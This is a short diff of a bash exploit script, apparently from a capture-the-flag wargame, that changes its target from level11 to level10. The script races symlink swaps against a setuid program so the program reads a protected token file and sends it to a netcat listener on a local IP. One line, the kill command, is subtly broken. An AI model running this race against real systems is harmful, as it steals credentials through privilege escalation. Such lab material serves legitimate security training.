@@ -5,8 +5,8 @@ filesize=0
 while [ $filesize -le 8 ]
 do
         rm -f /tmp/output
-        while [ ! -s /tmp/output ] ; do ln -sf /home/user/level11/token /tmp/link 2> /dev/null; ln -sf /tmp/null /tmp/link 2> /dev/null; done &
-        while [ ! -s /tmp/output ] ; do ./level11 /tmp/link 10.12.1.130 > /dev/null; done &
+        while [ ! -s /tmp/output ] ; do ln -sf /home/user/level10/token /tmp/link 2> /dev/null; ln -sf /tmp/null /tmp/link 2> /dev/null; done &
+        while [ ! -s /tmp/output ] ; do ./level10 /tmp/link 10.12.1.130 > /dev/null; done &
         nc -lk 6969 > /tmp/output &
         while [ ! -s /tmp/output ] ; do sleep 0.01; done
         kill -9 ps -ef | grep 'nc -lk 6969' | head -1 | awk '{print $2}'
